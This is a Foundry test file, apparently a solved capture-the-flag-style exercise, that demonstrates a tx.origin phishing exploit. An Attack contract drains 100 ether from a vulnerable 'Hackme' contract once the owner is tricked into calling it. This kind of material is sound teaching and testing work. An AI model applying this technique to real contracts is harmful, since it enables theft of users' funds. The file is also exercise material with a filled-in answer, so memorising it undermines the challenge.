// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Hackme} from "../src/Vulnerable.sol";
import {Attack} from "../src/Attack.sol";

contract Exploit is Test {
    Hackme public _hackme;
    address owner;
    address hacker;
    Attack public _attack;
    function setUp() public {
        owner = vm.addr(0x001);
        
        hacker = vm.addr(0x002);
        //initialize owner with 100 ether
        payable(owner).transfer(100 ether);
        vm.startPrank(owner);
        _hackme = new Hackme();
        _hackme.add{value: 100 ether}();
        vm.stopPrank();
        
       
    }

    function test_TxOriginExploit() public  {
        
        //check that the owner of hackme is owner  
        assertEq(_hackme.owner(), owner);
        //check that the contract has 100 ether 
        assertEq(payable(address(_hackme)).balance, 100 ether);
        //check that the balance of the owner is 0 ether
        assertEq(payable(owner).balance, 0 ether);
        //check that the hacker has 0 ether
        assertEq(payable(hacker).balance, 0 ether);
        //DO NOT EDIT ABOVE THIS LINE
        
        /**
        
            Write your exploit here and make the hacker rich. 
            
        */

         vm.prank(hacker);
        _attack = new Attack(address(_hackme));
        
        // here we simulate that the owner of hackme is tricked in calling a function on the attack contract
        vm.prank(owner, owner);
        _attack.fakeBuyTokens(1);
        
        //DO NOT EDIT BELOW THIS LINE

        //check that hacker has now 100 ether
        assertEq(payable(hacker).balance, 100 ether);
        //check that hackme has 0 ether
        assertEq(payable(address(_hackme)).balance, 0 ether);

    }
}
